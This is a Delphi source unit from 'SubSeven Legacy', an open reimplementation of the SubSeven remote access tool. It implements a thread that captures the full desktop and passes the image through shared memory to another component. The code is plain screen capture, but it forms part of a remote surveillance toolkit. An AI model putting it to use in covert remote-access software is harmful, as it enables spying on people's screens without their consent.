{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit S7ScreenServer;

interface

uses S7InterProcessCommunication, System.Classes;

type
  TS7ScreenServer = class(TThread)
  private
    FScreenServer_IPC : TS7InterProcessCommunicationServer;

    {@M}
    procedure DoQuery();
  protected
    {@M}
    procedure Execute(); override;
  public
    {@C}
    constructor Create(); overload;
    destructor Destroy(); override;
  end;

implementation

uses S7Protocol, S7ScreenClient, Winapi.Windows, VCL.Graphics, System.SysUtils,
     VCL.Forms;


{-------------------------------------------------------------------------------
  Generate new desktop image
-------------------------------------------------------------------------------}
procedure TS7ScreenServer.DoQuery();
var ABitBltInfo : TS7BitBltInfo;
    ABitmap     : TBitmap;
    ADesktop    : HDC;
    AStream     : TMemoryStream;
begin
  ABitBltInfo := PS7BitBltInfo(FScreenServer_IPC.GetDataOffset())^;
  ///

  ABitmap := TBitmap.Create();
  try
    ABitmap.SetSize(Screen.Width, Screen.Height);
    ///

    ABitmap.PixelFormat := pf32bit;

    {
      Capture Desktop
    }
    ADesktop := GetWindowDC(GetDesktopWindow());
    try
      Winapi.Windows.BitBlt(
                              ABitmap.Canvas.Handle,
                              0,
                              0,
                              ABitmap.Width,
                              ABitmap.Height,
                              ADesktop,
                              0,
                              0,
                              SRCCOPY
      );
    finally
      ReleaseDC(GetDesktopWindow(), ADesktop);
    end;

    {
      Copy Image Buffer to Shared Mapped Memory
    }
    AStream := TMemoryStream.Create();
    try
      ABitmap.SaveToStream(AStream);

      FScreenServer_IPC.WriteBuffer(AStream.Memory, AStream.Size);
    finally
      if Assigned(AStream) then
        FreeAndNil(AStream);
    end;
  finally
    if Assigned(ABitmap) then
      FreeAndNil(ABitmap);
  end;
end;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TS7ScreenServer.Create();
begin
  inherited Create(False);
  ///

  self.FreeOnTerminate := True;
  self.Priority        := tpNormal;
end;

{-------------------------------------------------------------------------------
  ___destructor
-------------------------------------------------------------------------------}
destructor TS7ScreenServer.Destroy();
begin

  ///
  inherited Destroy();
end;

{-------------------------------------------------------------------------------
  ___execute
-------------------------------------------------------------------------------}
procedure TS7ScreenServer.Execute();
begin
  try
    FScreenServer_IPC := TS7InterProcessCommunicationServer.Create(
      S7_MEM_SCREENHELPER_USR,
      S7_MEM_SCREENHELPER_MSIZE
    );
    try
      while not Terminated do begin
        if FScreenServer_IPC.WaitForQuery(1000) = WAIT_TIMEOUT then
          continue;
        try
          self.DoQuery();
        finally
          FScreenServer_IPC.QueryDone();
        end;
      end;
    finally
      if Assigned(FScreenServer_IPC) then
        FreeAndNil(FScreenServer_IPC);
    end;
  finally
    ExitThread(0); //!important;
  end;
end;

end.

